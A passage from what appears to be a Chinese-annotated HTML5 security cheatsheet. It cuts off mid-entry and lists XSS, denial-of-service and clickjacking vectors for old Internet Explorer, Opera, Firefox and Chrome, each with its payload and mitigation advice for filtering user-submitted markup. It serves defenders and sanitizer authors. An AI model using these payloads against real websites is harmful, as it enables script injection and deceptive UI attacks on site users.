<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!&#62;</span><br></pre></td></tr></table></figure>
<p>不要允许用户提交的HTML中含有”pattern”属性,确保验证的正则写的没啥问题.</p>
<ul>
<li><p>opera 10.0</p>
</li>
<li><p>dos</p>
</li>
<li>pattern</li>
<li>regex</li>
<li>html5</li>
<li>validation</li>
<li>opera</li>
<li><p>proprietary</p>
</li>
<li><p><a href="http://www.whatwg.org/specs/web-apps/current-work/#the-pattern-attribute" target="_blank" rel="external">http://www.whatwg.org/specs/web-apps/current-work/#the-pattern-attribute</a></p>
</li>
<li><a href="http://en.wikipedia.org/wiki/Regular_expression_Denial_of_Service_-_ReDoS" target="_blank" rel="external">http://en.wikipedia.org/wiki/Regular_expression_Denial_of<em>Service</em>-_ReDoS</a></li>
</ul>
<p>reporter：.mario</p>
<h3 id="Input_stealing/form_DoS_with_onblur=focus()_and_autofocus#22test">Input stealing/form DoS with onblur=focus() and autofocus<a href="#22">#22</a><a href="test/#22">test</a></h3><p>This very basic vector demonstrates how the combination of “autofocus” and “onblur” can render any other form on the targeted website useless.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;input onblur=focus() autofocus&#62;&#60;input&#62;</span><br></pre></td></tr></table></figure>
<p>User submitted markup should not contain “autofocus” attributes.</p>
<ul>
<li>opera 9.0</li>
<li><p>opera latest</p>
</li>
<li><p>chrome 3.0</p>
</li>
<li><p>chrome latest</p>
</li>
<li><p>safari 5.0</p>
</li>
<li><p>safari latest</p>
</li>
<li><p>dos</p>
</li>
<li>javascript</li>
<li>opera</li>
<li>chrome</li>
<li>safari</li>
<li>autofocus</li>
<li>onblur</li>
<li><p>html5</p>
</li>
<li><p><a href="http://www.w3.org/Bugs/Public/show_bug.cgi?id=9602" target="_blank" rel="external">http://www.w3.org/Bugs/Public/show_bug.cgi?id=9602</a></p>
</li>
</ul>
<p>reporter：Skyphire, Gareth, .mario</p>
<h2 id="HTML_behavior和binding相关向量">HTML behavior和binding相关向量</h2><h3 id="使用HTML+TIME和onbegin执行Javascript#16test">使用HTML+TIME和onbegin执行Javascript<a href="#16">#16</a><a href="test/#16">test</a></h3><p>使用HTML+TIME behavior可以使任意标签处理onbegin事件.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X&#60;x style=`behavior:url(#default#time2)` onbegin=`write(1)` &#62;</span><br></pre></td></tr></table></figure>
<p>不允许用户在提交的标签或CSS中含有behavior属性,HTML+TIME API提供了很多方法来执行Javascript,如果有可能,不用使用黑名单的方式处理HTML危险标签.</p>
<ul>
<li>internet explorer 5.5</li>
<li><p>internet explorer 8.0</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>ie</li>
<li>behavior</li>
<li>html+time</li>
<li><p>onbegin</p>
</li>
<li><p><a href="http://msdn.microsoft.com/en-us/library/ms533102%28VS.85%29.aspx" target="_blank" rel="external">http://msdn.microsoft.com/en-us/library/ms533102%28VS.85%29.aspx</a></p>
</li>
</ul>
<p>reporter：.mario</p>
<h3 id="JavaScript_execution_via_HTML+TIME_without_user_interaction_(1)#24test">JavaScript execution via HTML+TIME without user interaction (1)<a href="#24">#24</a><a href="test/#24">test</a></h3><p>This obfuscated vector uses HTML+TIME to execute JavaScript without user interaction - and without suspicious event handlers but just “attributename” and “to” attributes.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#60;set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#38;#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&#38;lt;img/src=&#38;quot;x&#38;quot;onerror=alert(1)&#38;gt;`&#62;</span><br></pre></td></tr></table></figure>
<p>Don’t allow behavior properties in user submitted CSS and markup and don’t rely on blacklists regarding dangerous HTML tags. The rather unknown HTML+TIME API provides too many ways to execute JavaScript with and without user interaction on exotic ways. Avoid blacklists if possible.</p>
<ul>
<li>internet explorer 5.5</li>
<li><p>internet explorer 8.0</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>ie</li>
<li>behavior</li>
<li>html+time</li>
<li>attributename</li>
<li>to</li>
<li><p>proprietary</p>
</li>
<li><p><a href="http://msdn.microsoft.com/en-us/library/ms533102%28VS.85%29.aspx" target="_blank" rel="external">http://msdn.microsoft.com/en-us/library/ms533102%28VS.85%29.aspx</a></p>
</li>
</ul>
<p>reporter：.mario</p>
<h3 id="JavaScript_execution_via_HTML+TIME_without_user_interaction_(2)#28test">JavaScript execution via HTML+TIME without user interaction (2)<a href="#28">#28</a><a href="test/#28">test</a></h3><p>This HTML+TIME vector utilized the attributes “attributename” and “values” to map encoded markup into an attribute to execute JavaScript.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#60;animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&#38;lt;img/src=&#38;quot;.&#38;quot;onerror=alert(1)&#38;gt;&#62;</span><br></pre></td></tr></table></figure>
<p>As soon as the HTML+TIME namespace and the behavior property are mapped to a HTML element a whole range of new attributes to execute JavaScript is available. In user submitted html “xmlns” attributes should not be allowed - as well as “behavior” properties for style tags and attribtes. Don’t rely on blacklisting when dealing with user submitted markup.</p>
<ul>
<li>internet explorer 5.5</li>
<li><p>internet explorer 8.0</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>internet explorer</li>
<li>behavior</li>
<li>style</li>
<li>html+time</li>
<li>attributename</li>
<li>values</li>
<li><p>proprietary</p>
</li>
<li><p><a href="http://msdn.microsoft.com/en-us/library/ms533102%28VS.85%29.aspx" target="_blank" rel="external">http://msdn.microsoft.com/en-us/library/ms533102%28VS.85%29.aspx</a></p>
</li>
</ul>
<p>reporter：LeverOne</p>
<h3 id="VML_frame_with_embedded_VML_object_plus_onmouseover#34test">VML frame with embedded VML object plus onmouseover<a href="#34">#34</a><a href="test/#34">test</a></h3><p>A VML frame object works by giving the VML frame a “src” attribute and have it point to another VML object. A VML frame object in quirks mode can enclose a VML rect object or regular HTML which is responding to mouseover events.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#60;vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=test.vml#xss&#62;&#60;/vmlframe&#62;</span><br></pre></td></tr></table></figure>
<p>Don’t allow behavior properties in user submitted CSS and markup and don’t rely on blacklists regarding dangerous HTML tags.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;xml&#62; &#60;rect style=&#34;height:100%;width:100%&#34; id=&#34;xss&#34; onmouseover=&#34;alert(1)&#34; strokecolor=&#34;white&#34; strokeweight=&#34;2000px&#34; filled=&#34;false&#34; /&#62; &#60;/xml&#62;crossdomain: 1name: test.vml</span><br></pre></td></tr></table></figure>
<ul>
<li>internet explorer 5.5</li>
<li><p>internet explorer latest (in older docmode)</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>style</li>
<li>behavior</li>
<li>vml</li>
<li>internet explorer</li>
<li><p>proprietary</p>
</li>
<li><p><a href="http://msdn.microsoft.com/en-us/library/bb263900%28VS.85%29.aspx" target="_blank" rel="external">http://msdn.microsoft.com/en-us/library/bb263900%28VS.85%29.aspx</a></p>
</li>
</ul>
<p>reporter：<a href="http://www.malware.com" target="_blank" rel="external">http://www.malware.com</a></p>
<h3 id="VML_line_object_utilizing_href_attribute_with_JavaScript_URI#35test">VML line object utilizing href attribute with JavaScript URI<a href="#35">#35</a><a href="test/#35">test</a></h3><p>The vector paints a very thick and wide line responding to clicks with JavaScript execution via JavaScript URI. Note that the actual URI is being masked in the status bar. During an overlay attack the victim will not know about the payload via status bar.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#60;a href=#&#62;&#60;line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /&#62;&#60;/a&#62;</span><br></pre></td></tr></table></figure>
<p>Don’t allow behavior properties in user submitted CSS and markup and don’t rely on blacklists regarding dangerous HTML tags.</p>
<ul>
<li>internet explorer 5.5</li>
<li><p>internet explorer latest (in older docmode)</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>style</li>
<li>behavior</li>
<li>vml</li>
<li>internet explorer</li>
<li><p>proprietary</p>
</li>
<li><p><a href="http://msdn.microsoft.com/en-us/library/bb229513%28VS.85%29.aspx" target="_blank" rel="external">http://msdn.microsoft.com/en-us/library/bb229513%28VS.85%29.aspx</a></p>
</li>
</ul>
<p>reporter：LeverOne</p>
<h3 id="AnchorClick_behavior_enabling_folder_attribute_as_href_replacement#36test">AnchorClick behavior enabling folder attribute as href replacement<a href="#36">#36</a><a href="test/#36">test</a></h3><p>Using the AnchorClick behavior allows to use the “folder” attribute as replacement for a “href” attribute on &lt;A&gt; elements. This example works up to IE 8 standards mode.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;a style=&#34;behavior:url(#default#AnchorClick);&#34; folder=&#34;javascript:alert(1)&#34;&#62;XXX&#60;/a&#62;</span><br></pre></td></tr></table></figure>
<p>Don’t allow behavior properties in user submitted CSS and markup and don’t rely on blacklists regarding dangerous HTML tags.</p>
<ul>
<li>internet explorer 5.5</li>
<li><p>internet explorer latest (in older docmode)</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>style</li>
<li>behavior</li>
<li>anchorclick</li>
<li>internet explorer</li>
<li><p>proprietary</p>
</li>
<li><p><a href="http://msdn.microsoft.com/en-us/library/ms531414%28VS.85%29.aspx" target="_blank" rel="external">http://msdn.microsoft.com/en-us/library/ms531414%28VS.85%29.aspx</a></p>
</li>
</ul>
<p>reporter：.mario</p>
<h3 id="Internet_Explorer_Scriptlets_executing_JavaScript#52test">Internet Explorer Scriptlets executing JavaScript<a href="#52">#52</a><a href="test/#52">test</a></h3><p>Internet Explorer supports Scriptlets as an alternative binding method for Data Islands. By using the shown examples JavaScript will execute without user interaction.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;x style=&#34;behavior:url(test.sct)&#34;&#62;</span><br></pre></td></tr></table></figure>
<p>Users should not be able to either submit CSS or HTML containing style attributes. If necessary make sure the “behavior” property is not whitelisted.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;SCRIPTLET&#62; &#60;IMPLEMENTS Type=&#34;Behavior&#34;&#62;&#60;/IMPLEMENTS&#62; &#60;SCRIPT Language=&#34;javascript&#34;&#62;alert(1)&#60;/SCRIPT&#62; &#60;/SCRIPTLET&#62;crossdomain: 0name: test.sct</span><br></pre></td></tr></table></figure>
<ul>
<li>internet explorer 5.5</li>
<li><p>internet explorer latest (in older docmodes)</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>behavior</li>
<li>scriptlet</li>
<li>internet explorer</li>
<li>style</li>
<li>css</li>
<li><p>sct</p>
</li>
<li><p><a href="http://msdn.microsoft.com/en-us/library/aa189871%28office.10%29.aspx" target="_blank" rel="external">http://msdn.microsoft.com/en-us/library/aa189871%28office.10%29.aspx</a></p>
</li>
<li><a href="http://msdn.microsoft.com/en-us/library/ms766512%28VS.85%29.aspx" target="_blank" rel="external">http://msdn.microsoft.com/en-us/library/ms766512%28VS.85%29.aspx</a></li>
</ul>
<p>reporter：.mario</p>
<h3 id="Internet_Explorer_Data_Islands_executing_JavaScript#53test">Internet Explorer Data Islands executing JavaScript<a href="#53">#53</a><a href="test/#53">test</a></h3><p>Internet Explorer supports Data Islands as an XMLish binding method. By using the shown examples JavaScript will execute without user interaction.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;xml id=&#34;xss&#34; src=&#34;test.htc&#34;&#62;&#60;/xml&#62; &#60;label dataformatas=&#34;html&#34; datasrc=&#34;#xss&#34; datafld=&#34;payload&#34;&#62;&#60;/label&#62;</span><br></pre></td></tr></table></figure>
<p>Users should not be able to submit HTML containing &lt;XML&gt; tags. If necessary make sure the “dataformatas” and “datasrc” attributes are not whitelisted.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;?xml version=&#34;1.0&#34;?&#62; &#60;x&#62; &#60;payload&#62;&#60;![CDATA[&#60;img src=x onerror=alert(1)&#62;]]&#62;&#60;/payload&#62; &#60;/x&#62;crossdomain: 0path: [http://html5sec.org/test.htc](http://html5sec.org/test.htc)name: test.htc</span><br></pre></td></tr></table></figure>
<ul>
<li>internet explorer 5.5</li>
<li><p>internet explorer latest (in older docmodes)</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>behavior</li>
<li>internet explorer</li>
<li>style</li>
<li>css</li>
<li><p>data island</p>
</li>
<li><p><a href="http://msdn.microsoft.com/en-us/library/ms766512%28VS.85%29.aspx" target="_blank" rel="external">http://msdn.microsoft.com/en-us/library/ms766512%28VS.85%29.aspx</a></p>
</li>
</ul>
<p>reporter：.mario</p>
<h3 id="Server-sent_events_-_Opera_and_&lt;EVENT-SOURCE&gt;_tags_(1)#73test">Server-sent events - Opera and &lt;EVENT-SOURCE&gt; tags (1)<a href="#73">#73</a><a href="test/#73">test</a></h3><p>Opera allows using &lt;EVENT-SOURCE&gt; elements. In case the “src” attribute points to a valid cross domain source it’s possible to have the element listen for events and the containing data.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;event-source src=&#34;event.php&#34; onload=&#34;alert(1)&#34;&#62;</span><br></pre></td></tr></table></figure>
<p>Make sure users cannot influence the source of &lt;EVENT-SOURCE&gt; elements and don’t whitelist the tag itself inside user submitted markup.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;?php header(&#34;Content-Type: application/x-dom-event-stream&#34;); die(&#34;Event: load\ndata: \n\n&#34;); ?&#62;crossdomain: 1path: [http://html5sec.org/event.php](http://html5sec.org/event.php)name: event.php</span><br></pre></td></tr></table></figure>
<ul>
<li>opera 8.x</li>
<li><p>opera 10.63</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>event-source</li>
<li>opera</li>
<li><p>sse</p>
</li>
<li><p><a href="http://hixie.ch/specs/html/server-sent-events/server-sent-events" target="_blank" rel="external">http://hixie.ch/specs/html/server-sent-events/server-sent-events</a></p>
</li>
</ul>
<p>reporter：.mario</p>
<h3 id="Server-sent_events_-_Opera_and_&lt;EVENT-SOURCE&gt;_tags_(2)#74test">Server-sent events - Opera and &lt;EVENT-SOURCE&gt; tags (2)<a href="#74">#74</a><a href="test/#74">test</a></h3><p>Opera allows using &lt;EVENT-SOURCE&gt; tags to receive server-sent events. In this example a data URI is being used as an event source triggering a click on another HTML element. In an attack scenario an XSS requiring user interaction can be turned into an active script execution this way.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;a href=&#34;javascript:alert(1)&#34;&#62;&#60;event-source src=&#34;data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A&#34; /&#62;&#60;/a&#62;</span><br></pre></td></tr></table></figure>
<p>Make sure users cannot influence the source of &lt;EVENT-SOURCE&gt; elements and don’t whitelist the tag itself inside user submitted markup.</p>
<ul>
<li>opera 8.x</li>
<li><p>opera 10.63</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>event-source</li>
<li>opera</li>
<li><p>sse</p>
</li>
<li><p><a href="http://hixie.ch/specs/html/server-sent-events/server-sent-events" target="_blank" rel="external">http://hixie.ch/specs/html/server-sent-events/server-sent-events</a></p>
</li>
</ul>
<p>reporter：.mario</p>
<h3 id="Internet_Explorer_applying_behavior_via_&lt;import_namespace&gt;#116test">Internet Explorer applying behavior via &lt;import namespace&gt;<a href="#116">#116</a><a href="test/#116">test</a></h3><p>Internet Explorer allows to apply namespaces and attach behaviors not only by using CSS but &lt;import&gt; or &lt;?import&gt; tags. The example shows how to work with HTML+TIME behaviors without using style attributes or tags and cause script execution via the to attribute. If there is no attribute “targetElement”, will be overridden “innerHTML” property of the &lt;body&gt; tag. To limit the area that be changed, you can use the attribute “targetElement”. This syntax is also supported in IE9 for non-obsolete behaviors.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;div id=&#34;x&#34;&#62;x&#60;/div&#62; &#60;xml:namespace prefix=&#34;t&#34;&#62; &#60;import namespace=&#34;t&#34; implementation=&#34;#default#time2&#34;&#62; &#60;t:set attributeName=&#34;innerHTML&#34; targetElement=&#34;x&#34; to=&#34;&#38;lt;img&#38;#11;src=x:x&#38;#11;onerror&#38;#11;=alert(1)&#38;gt;&#34;&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>internet explorer 6.0</li>
<li><p>internet explorer 8.0</p>
</li>
<li><p>xss</p>
</li>
<li>behavior</li>
<li>import</li>
<li>xml</li>
<li>namespace</li>
<li>time</li>
<li><p>entities</p>
</li>
<li><p><a href="http://msdn.microsoft.com/en-us/library/ms533793%28v=vs.85%29.aspx" target="_blank" rel="external">http://msdn.microsoft.com/en-us/library/ms533793%28v=vs.85%29.aspx</a></p>
</li>
<li><a href="#16">#16</a></li>
<li><a href="#24">#24</a></li>
<li><a href="#28">#28</a></li>
</ul>
<p>reporter：LeverOne, GreyMagic</p>
<h2 id="Clickjacking和UI_Redressing的向量">Clickjacking和UI Redressing的向量</h2><h3 id="Reverse_clickjacking_via_&lt;IFRAME&gt;#117test">Reverse clickjacking via &lt;IFRAME&gt;<a href="#117">#117</a><a href="test/#117">test</a></h3><p>Internet Explorer allows to place &lt;IFRAME&gt; tags inside &lt;A&gt; tags. By clicking on a not clickable element inside the IFRAME there will be executed the URL defined in the “href” attribute of the &lt;A&gt; tag.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;a href=&#34;http://attacker.org&#34;&#62; &#60;iframe src=&#34;http://example.org/&#34;&#62;&#60;/iframe&#62; &#60;/a&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>internet explorer 8.0</li>
<li><p>internet explorer 9.0</p>
</li>
<li><p>clickjacking</p>
</li>
<li>internet explorer</li>
<li><p>iframe</p>
</li>
<li><p><a href="http://iseclab.org/papers/asiaccs122-balduzzi.pdf" target="_blank" rel="external">http://iseclab.org/papers/asiaccs122-balduzzi.pdf</a></p>
</li>
</ul>
<p>reporter：mniemietz</p>
<h3 id="Text_injection_by_drag-and-drop#118test">Text injection by drag-and-drop<a href="#118">#118</a><a href="test/#118">test</a></h3><p>The method “setData” allows, with the event handler “ondragstart” and the attribute “draggable” with the value “true”, to drag the text “malicious code” and not “Drop me” into the IFRAME. This IFRAME can consist of a web page with an input field to drop in data. Note that cross-origin drag&amp;drop has meanwhile been heavily restricted in power due to security risks.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;div draggable=&#34;true&#34; ondragstart=&#34;event.dataTransfer.setData(&#39;text/plain&#39;,&#39;malicious code&#39;);&#34;&#62; &#60;h1&#62;Drop me&#60;/h1&#62; &#60;/div&#62; &#60;iframe src=&#34;http://www.example.org/dropHere.html&#34;&#62;&#60;/iframe&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>opera 12.0</p>
</li>
<li><p>firefox 3.x</p>
</li>
<li><p>firefox 15.0</p>
</li>
<li><p>safari 5.0</p>
</li>
<li><p>safari 5.1.7</p>
</li>
<li><p>clickjacking</p>
</li>
<li>firefox</li>
<li>drag-and-drop</li>
<li>setData</li>
<li>ondragstart</li>
<li><p>draggable</p>
</li>
<li><p><a href="http://www.w3.org/TR/html5/dnd.html#dnd" target="_blank" rel="external">http://www.w3.org/TR/html5/dnd.html#dnd</a></p>
</li>
</ul>
<p>reporter：mniemietz</p>
<h3 id="Content_extraction_via_view-source#119test">Content extraction via view-source<a href="#119">#119</a><a href="test/#119">test</a></h3><p>To show the source code of a web page inside the web browser Mozilla Firefox or Google Chrome, “view-source:” can be used as a prefix for the URL. Firefox - and that is essential for this vector - allows iframes to show view-source: URLs. With the combination of a “textarea” tag, just two drags to perform this attack are needed, as in the case of elements like images. The first drag is to select an element and the second to drag an element out of the iframe into the text area. This method also bypasses CSS and JS based clickjacking protection.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;iframe src=&#34;view-source:http://www.example.org/&#34; frameborder=&#34;0&#34; style=&#34;width:400px;height:180px&#34;&#62;&#60;/iframe&#62; &#60;textarea type=&#34;text&#34; cols=&#34;50&#34; rows=&#34;10&#34;&#62;&#60;/textarea&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>firefox 2.x</li>
<li><p>firefox 13.0</p>
</li>
<li><p>clickjacking</p>
</li>
<li>firefox</li>
<li>content extraction</li>
<li><p>view-source</p>
</li>
<li><p><a href="http://www.contextis.co.uk/resources/white-papers/clickjacking/Context-Clickjacking_white_paper.pdf" target="_blank" rel="external">http://www.contextis.co.uk/resources/white-papers/clickjacking/Context-Clickjacking_white_paper.pdf</a></p>
</li>
</ul>
<p>reporter：mniemietz</p>
<h3 id="Pop-up_blocker_bypass#120test">Pop-up blocker bypass<a href="#120">#120</a><a href="test/#120">test</a></h3><p>A web browser like Firefox distinguishes between trusted and not trusted events, depending on the situation. User interactions like a click will be trusted for the reason that they are made explicitly by the user. If a web page initiates an event like opening a pop-up window automatically, the event is not trusted and therefore blocked. Tests have shown that other browsers like Google Chrome or Opera behave similarly. With the use of clickjacking techniques, an attacker can get its victim to create a trusted event by clicking on a link that opens one or more pop-up windows. Thus, an attacker can get the victim to unknowingly trigger a trusted event by doing a click. This event can be recycled by an attacker for later usage or directly used to e.g. generate pop-up windows that the user does not desire.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;script&#62; function makePopups()&#123; for (i=1;i&#60;6;i++) &#123; window.open(&#39;popup.html&#39;,&#39;spam&#39;+i,&#39;width=50,height=50&#39;); &#125; &#125; &#60;/script&#62; &#60;body&#62; &#60;a href=&#34;#&#34; onclick=&#34;makePopups()&#34;&#62;Spam&#60;/a&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>internet explorer 5.0</li>
<li><p>internet explorer 9.0</p>
</li>
<li><p>firefox 2.x</p>
</li>
<li><p>firefox latest</p>
</li>
<li><p>chrome 6.0</p>
</li>
<li><p>chrome 23.0</p>
</li>
<li><p>safari 5.0</p>
</li>
<li><p>safari 5.1.7</p>
</li>
<li><p>clickjacking</p>
</li>
<li>internet explorer</li>
<li>opera</li>
<li>firefox</li>
<li>chrome</li>
<li>safari</li>
<li><p>pop-up</p>
</li>
<li><p><a href="http://help.dottoro.com/ljoljvsn.php" target="_blank" rel="external">http://help.dottoro.com/ljoljvsn.php</a></p>
</li>
<li><a href="http://ui-redressing.mniemietz.de/uiRedressing.pdf" target="_blank" rel="external">http://ui-redressing.mniemietz.de/uiRedressing.pdf</a></li>
</ul>
<p>reporter：mniemietz</p>
<h3 id="SVG_masking#121test">SVG masking<a href="#121">#121</a><a href="test/#121">test</a></h3><p>Masking elements can greatly simplify a clickjacking attack. Here, a “body” tag with the “style” attribute “background:gray” is given. As the name suggests, the background of the web page will have the color gray. The “iframe” tag holds the attributes “src” and “style”. The URL of the target web page is the value of the “src” attribute. Inside the “style” attribute there is information to the width, the height, and the border of the web page. Finally, there is the property “mask” with “url(#maskForClickjacking)”. This “url” points to an SVG with the “id” value “maskForClickjacking”. On the next line, an “svg” tag with the namespace “svg” is de?ned. After that, a “mask” tag with the attributes “id”, “maskUnits” and “maskContentUnits” is inside the “svg” tag. The attribute “id” holds the value “maskForClickjacking”, which is exactly the value inside the “url”. The attribute “maskUnits” de?nes the coordinate system for the data of “x”, “y”, “width” and “height”. The second attribute “maskContentUnits” de?nes the coordinate system for the contents of the “mask” with “objectBoundingBox”. Inside the “mask” tag, there are two tags called “rect” and “circle”. Each tag holds information to the position and is determined by the geometric shape the width and height or radius. The attribute “fill”, with the value “white”, ensures that the viewing whole in the mask is visible.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;html xmlns=&#34;http://www.w3.org/1999/xhtml&#34; xmlns:svg=&#34;http://www.w3.org/2000/svg&#34;&#62; &#60;body style=&#34;background:gray&#34;&#62; &#60;iframe src=&#34;http://example.com/&#34; style=&#34;width:800px; height:350px; border:none; mask: url(#maskForClickjacking);&#34;/&#62; &#60;svg:svg&#62; &#60;svg:mask id=&#34;maskForClickjacking&#34; maskUnits=&#34;objectBoundingBox&#34; maskContentUnits=&#34;objectBoundingBox&#34;&#62; &#60;svg:rect x=&#34;0.0&#34; y=&#34;0.0&#34; width=&#34;0.373&#34; height=&#34;0.3&#34; fill=&#34;white&#34;/&#62; &#60;svg:circle cx=&#34;0.45&#34; cy=&#34;0.7&#34; r=&#34;0.075&#34; fill=&#34;white&#34;/&#62; &#60;/svg:mask&#62; &#60;/svg:svg&#62; &#60;/body&#62; &#60;/html&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>firefox 3.x</li>
<li><p>firefox latest</p>
</li>
<li><p>clickjacking</p>
</li>
<li>firefox</li>
<li>svg</li>
<li><p>masking</p>
</li>
<li><p><a href="http://www.w3.org/Graphics/SVG/" target="_blank" rel="external">http://www.w3.org/Graphics/SVG/</a></p>
</li>
<li><a href="http://www.w3.org/TR/SVG/masking.html" target="_blank" rel="external">http://www.w3.org/TR/SVG/masking.html</a></li>
<li><a href="http://www.gnucitizen.org/blog/even-more-advanced-clickjacking/" target="_blank" rel="external">http://www.gnucitizen.org/blog/even-more-advanced-clickjacking/</a></li>
</ul>
<p>reporter：mniemietz</p>
<h3 id="Sandboxed_Iframes#122test">Sandboxed Iframes<a href="#122">#122</a><a href="test/#122">test</a></h3><p>Google Chrome implements the HTML5 “sandboxed iframes”. This particular example shows on how to turn this feature against websites only using JavaScript based frame-busters. Note that the framed website can still execute JavaScript - but has no privileges to modify the top frame’s location. This would only be possible if the sandbox attribute also came with the “allow-top-navigation” parameter.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;iframe sandbox=&#34;allow-same-origin allow-forms allow-scripts&#34; src=&#34;http://example.org/&#34;&#62;&#60;/iframe&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>chrome 8.0</li>
<li><p>chrome latest</p>
</li>
<li><p>internet explorer 10.0</p>
</li>
<li><p>internet explorer latest</p>
</li>
<li><p>safari 5.1.7</p>
</li>
<li><p>safari latest</p>
</li>
<li><p>opera 15.0</p>
</li>
<li><p>opera latest</p>
</li>
<li><p>clickjacking</p>
</li>
<li>chrome</li>
<li>iframe</li>
<li><p>sandbox</p>
</li>
<li><p><a href="http://www.whatwg.org/specs/web-apps/current-work/multipage/the-iframe-element.html#attr-iframe-sandbox" target="_blank" rel="external">http://www.whatwg.org/specs/web-apps/current-work/multipage/the-iframe-element.html#attr-iframe-sandbox</a></p>
</li>
<li><a href="http://blog.kotowicz.net/2010/11/xss-track-how-to-quietly-track-whole.html" target="_blank" rel="external">http://blog.kotowicz.net/2010/11/xss-track-how-to-quietly-track-whole.html</a></li>
</ul>
<p>reporter：kkotowicz</p>
<h3 id="Classjacking_with_jQuery#123test">Classjacking with jQuery<a href="#123">#123</a><a href="test/#123">test</a></h3><p>CSS offers the attribute “class” as a selector to style a group of HTML elements. Consequently, it is feasible to style e.g. “span” and “a” tags. Here, the “span” tag has the value “foo” and the “a” tag the value “bar” inside the “class” attribute. This values can be used to define the font size or other CSS-specific properties. The first “script” tag holds an “src” attribute with the value “<a href="http://code.jquery.com/jquery-1.4.4.js" target="_blank" rel="external">http://code.jquery.com/jquery-1.4.4.js</a>“. It is a reference to a file of the “jQuery JavaScript Library v1.4.4”. The name “jQuery” stands for a JavaScript Library that simplifies HTML document traversing, event handling, animating, and Ajax interactions. So it is ideally suited to deal with user interactions and to manipulate them, as required for complex UI redressing attacks. Thus, “jQuery” is given in the second “script” tag. At first, the “span” tag is selected, which holds the value “foo” in the “class” attribute. After that, “.click” is implemented. It can be used to bind an event handler to the “click” JavaScript event, or to trigger that event on an element. In this case, an alert window will be executed with the text “foo” after clicking on the “Some text” value of the “span” tag. After closing the alert window, a click event is triggered on the “a” tag with the value “bar” inside the “class” attribute. Analogue to the first event, an alert window appears with the text “bar”. After closing the alert window, the web browser will redirect the web page to “<a href="http://html5sec.org" target="_blank" rel="external">http://html5sec.org</a>“. If there is a click on the link “<a href="http://www.example.org" target="_blank" rel="external">http://www.example.org</a>“ and not on the text “Some text”, an alert window is displayed with the text “bar” followed by a redirection to “<a href="http://example.org" 